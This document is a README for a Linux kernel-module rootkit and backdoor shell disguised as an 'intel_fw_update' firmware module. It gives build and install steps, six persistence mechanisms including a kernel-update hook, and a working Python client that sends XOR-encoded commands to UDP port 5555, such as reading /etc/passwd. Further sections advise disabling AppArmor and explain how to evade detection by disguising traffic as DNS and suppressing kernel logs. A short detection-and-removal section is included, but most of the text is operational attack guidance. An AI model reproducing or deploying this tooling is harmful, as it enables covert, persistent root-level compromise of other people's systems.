# Linux Kernel Module C2 Shell - Installation & Usage Guide

---

## Overview

This is a Linux kernel module-based command and control shell that:
- Intercepts network packets at the kernel level via netfilter hooks
- Listens on **UDP port 5555** for incoming commands
- Executes commands via `call_usermodehelper()`
- Captures and returns command output
- Hides itself from the kernel module list
- Runs with **kernel-level privileges** (highest access)

---

## Prerequisites

- **Linux kernel headers** (matching your kernel version)
- **GCC compiler** with kernel build tools
- **Make** utility
- **Root/sudo access** for compilation and installation
- **Linux 4.0+** (for netfilter hooks API compatibility)

### Install Prerequisites

**Ubuntu/Debian:**
```bash
sudo apt-get update
sudo apt-get install build-essential linux-headers-$(uname -r) wget
```

**CentOS/RHEL:**
```bash
sudo yum groupinstall "Development Tools"
sudo yum install kernel-devel-$(uname -r)
```

**Fedora:**
```bash
sudo dnf groupinstall "Development Tools"
sudo dnf install kernel-devel-$(uname -r)
```

---

## COMPILATION

### Prerequisites Check

```bash
# Verify kernel headers are installed
ls /lib/modules/$(uname -r)/build

# If missing, install them:
sudo apt-get update
sudo apt-get install linux-headers-$(uname -r) build-essential
```

### Build the Module

```bash
cd linux-(tested)

# Compile the kernel module
make

# Verify compilation succeeded
file intel_fw_update.ko
# Expected: ELF 64-bit LSB relocatable module...

# Clean (if needed)
make clean
```

The provided Makefile handles all compilation details. It will create `intel_fw_update.ko` in the current directory, which is required by the `install.sh` script.

---

## INSTALLATION

### Quick Installation (Automated)

The easiest way is to use the provided install script:

```bash
cd linux-(tested)

# Compile the module
make

# Run the installer (handles persistence, kernel hooks, etc.)
sudo ./install.sh
```

The script will:
- ✓ Compile the kernel module (if not already compiled)
- ✓ Create hidden module directory
- ✓ Copy module to kernel modules directory
- ✓ Add to `/etc/modules` for autoload
- ✓ Update initramfs for early boot loading
- ✓ Create kernel update hook (survives kernel upgrades)
- ✓ Update module dependencies with depmod
- ✓ Load the module immediately

### Verify Installation

After running the install script, verify it's working:

```bash
# Check if module is loaded
sudo lsmod | grep intel_fw_update

# Check listening port
sudo netstat -ulnp | grep 5555

# View hidden module location
ls -la /usr/local/.intel_fw_update/

# Check module installation directory
ls -la /lib/modules/$(uname -r)/updates/firmware-intel/

# Check kernel hook
ls -la /etc/kernel/postinst.d/ | grep intel
```

---

## PERSISTENT INSTALLATION

The `install.sh` script handles all persistence setup automatically. Simply run:

```bash
cd linux-(tested)
./install.sh
```

### What the Install Script Does

The script sets up **multiple persistence mechanisms** to ensure the module survives reboots and kernel updates:

**1. Hidden Module Storage**
- Copies compiled `.ko` to `/usr/local/.intel_fw_update/` (restricted permissions: 700)
- Hidden from normal directory listings
- Survives removal of kernel modules

**2. Kernel Modules Directory**
- Installs to `/lib/modules/$(uname -r)/updates/firmware-intel/`
- Loaded automatically by kernel at boot time

**3. `/etc/modules` Autoload**
- Adds `intel_fw_update` to `/etc/modules` for boot-time loading
- Module loads before most network services start

**4. Initramfs Integration**
- Updates initial RAM filesystem (`update-initramfs`)
- Module available early in boot process

**5. Kernel Update Hook** ⭐ (Most Robust)
- Creates `/etc/kernel/postinst.d/install_intel_fw_update_module` hook script
- **Automatically reinstalls module after kernel updates**
- Survives `apt full-upgrade` and kernel patches
- Module persists across major kernel version changes

**6. Depmod Integration**
- Updates module dependencies with `depmod`
- Kernel automatically detects and loads module

### Manual Setup (If Needed)

If you need to run parts manually:

```bash
# Build module
make

# Then install everything with the script
sudo ./install.sh

# Or install just the compiled module manually
sudo insmod intel_fw_update.ko

# Add to autoload
echo "intel_fw_update" | sudo tee -a /etc/modules

# Update initramfs
sudo update-initramfs -u
```

---

## CLIENT COMMUNICATION

### Connect to the Shell

The module listens for UDP packets on **port 5555** with this format:

**Packet Structure:**
```
[MAGIC_HEADER: "INTLUPD:"][XOR-encoded command]
```

### Example Client (Python)

```python
import socket

def xor_encode(data, key=0x55):
    """XOR encode data with key"""
    return bytes([b ^ key for b in data])

def send_command(target_ip, command):
    """Send command to C2 shell and receive output"""
    
    # Prepare payload
    magic_header = b"INTLUPD:"
    encoded_cmd = xor_encode(command.encode())
    payload = magic_header + encoded_cmd
    
    # Send via UDP
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(payload, (target_ip, 5555))
    
    # Receive output
    try:
        sock.settimeout(5)
        output, _ = sock.recvfrom(4096)
        return output.decode('utf-8', errors='ignore')
    except socket.timeout:
        return "No response"
    finally:
        sock.close()

# Usage
if __name__ == "__main__":
    target = "192.168.1.100"
    commands = ["id", "whoami", "uname -a", "cat /etc/passwd"]
    
    for cmd in commands:
        print(f"[*] Sending: {cmd}")
        response = send_command(target, cmd)
        print(f"[+] Response:\n{response}\n")
```

### Available Commands

Any command available in the shell:
- `id` - current user/uid info
- `whoami` - current username
- `uname -a` - kernel/system info
- `cat /etc/passwd` - user list
- `ps aux` - running processes
- `ip a` or `ifconfig` - network config
- `ls -la /root` - directory listing

---

## DETECTION & REMOVAL

### What Could Give It Away

- **Netstat/ss:** Listening UDP port 5555 (non-standard port)
- **lsmod:** Module name `intel_fw_update` is suspicious
- **dmesg:** Kernel messages during load
- **Network monitoring:** UDP traffic to port 5555 with `INTLUPD:` header
- **eBPF/auditd:** Trace process execution from kernel
- **Packet capture:** Distinctive XOR-encoded payload pattern

### Detection Commands

```bash
# Check for suspicious listening ports
sudo netstat -ulnp | grep -v known_service

# List all loaded kernel modules
lsmod

# Check kernel messages for module activity
dmesg | grep intel_fw_update

# Monitor system calls in real-time
sudo strace -e trace=execve -p $(pgrep -f cmdname)

# Packet capture on port 5555
sudo tcpdump -i any udp port 5555 -A

# Check for iptables/netfilter rules
sudo iptables -L -n

# View active netfilter hooks
sudo cat /proc/net/nf_hooks_ipv4
```

### Removal

**Complete cleanup** (removes all persistence):

```bash
# Unload the module
sudo modprobe -r intel_fw_update

# Remove from autoload
sudo sed -i '/^intel_fw_update$/d' /etc/modules

# Remove from kernel updates directory
sudo rm -f /lib/modules/*/updates/firmware-intel/intel_fw_update.ko

# Remove kernel update hook
sudo rm -f /etc/kernel/postinst.d/install_intel_fw_update_module

# Remove hidden module storage
sudo rm -rf /usr/local/.intel_fw_update/

# Rebuild initramfs
sudo update-initramfs -u

# Rebuild depmod
sudo depmod -a

# Verify removal
lsmod | grep intel_fw_update  # Should show nothing
sudo netstat -ulnp | grep 5555  # Should show nothing
```

---

## TROUBLESHOOTING

### Installation Script Fails

```bash
# Ensure you have sudo access
sudo -v

# Check if .ko file exists
ls -la intel_fw_update.ko

# Run with verbose output
sudo bash -x ./install.sh 2>&1 | tail -50

# Common issues:
# - Not in the linux-(tested) directory
# - .ko not compiled yet (run `make` first)
# - Insufficient disk space in /lib/modules
```

### Module Won't Load After Reboot

```bash
# Check if module is in kernel modules directory
ls /lib/modules/$(uname -r)/updates/firmware-intel/

# Check if listed in /etc/modules
cat /etc/modules | grep intel_fw_update

# Check if initramfs is updated
sudo update-initramfs -u

# Reload module manually
sudo modprobe intel_fw_update

# Check dmesg for errors
dmesg | grep -i intel
```

### Port Not Listening

```bash
# Verify module is actually loaded
sudo lsmod | grep intel_fw_update

# Check netfilter hooks
sudo cat /proc/net/nf_hooks_ipv4

# Test with manual load
sudo modprobe -r intel_fw_update
sudo modprobe intel_fw_update
sudo netstat -ulnp | grep 5555
```

### Kernel Update Broke Module

The kernel update hook should handle this automatically, but if not:

```bash
# Check the hook exists
ls -la /etc/kernel/postinst.d/install_intel_fw_update_module

# Manually rebuild after kernel update
cd linux-(tested)
make clean
make
sudo ./install.sh
```

### Commands Not Executing

```bash
# Check if SELinux/AppArmor is blocking
sudo getenforce  # For SELinux
sudo aa-status   # For AppArmor

# Disable AppArmor (if causing issues)
sudo systemctl stop apparmor

# Check audit logs
sudo ausearch -k module_exec

# Test with simple command
python3 client.py 192.168.1.X "id"
```

---

## ADVANCED CUSTOMIZATION

### Change Listen Port

Edit `intel_fw_update.c`:
```c
#define LISTEN_PORT 5555  // Change to desired port
```

Recompile:
```bash
make clean
make
```

### Change Magic Header

Edit `intel_fw_update.c`:
```c
#define MAGIC_HEADER "INTLUPD:"  // Change header
#define MAGIC_LEN 8              // Update length
```

### Change XOR Key

Edit `intel_fw_update.c`:
```c
#define XOR_KEY 0x55  // Change encryption key
```

Then recompile and reinstall.

### Use Netcat as Test Client

```bash
# Create test payload (with magic header + command)
# Command: "id"
# XOR encoded with 0x55: i(0x69)^0x55=0x3C, d(0x64)^0x55=0x31

echo -ne "INTLUPD:\x3c\x31" | nc -u TARGET_IP 5555
```

---

## SECURITY NOTES

⚠️ **This tool is for authorized testing/red team operations only.**

- **UDP unencrypted:** Anyone on the network can see packets
- **XOR is weak:** Easy to reverse-engineer the payload
- **Port 5555 stands out:** Not a standard service port
- **Module name is obvious:** Name contains "intel" which looks suspicious
- **Kernel logs exposure:** Dmesg will show module load messages
- **No output encryption:** Command output sent in plaintext

### Recommendations for Production Use

1. **Use port 53 (DNS) or 443 (HTTPS)** to blend with legitimate traffic
2. **Implement real encryption** (AES-256-GCM instead of XOR)
3. **Randomize magic header** per payload
4. **Change port/header dynamically** based on timestamp
5. **Hide module name** using proper kernel rootkit techniques
6. **Filter dmesg output** to prevent logging
7. **Use legitimate-looking network traffic patterns**

---

## FILE STRUCTURE

```
linux-(tested)/
├── intel_fw_update.c           # Kernel module source
├── Makefile                     # Build configuration
├── README.md                    # This file
└── Module.symvers              # Generated during compilation
```

---

## REFERENCES

- Netfilter Documentation: https://www.netfilter.org/
- Linux Kernel Modules: https://www.kernel.org/doc/html/latest/admin-guide/modules.html
- UDP Socket Programming: https://man7.org/linux/man-pages/man7/udp.7.html
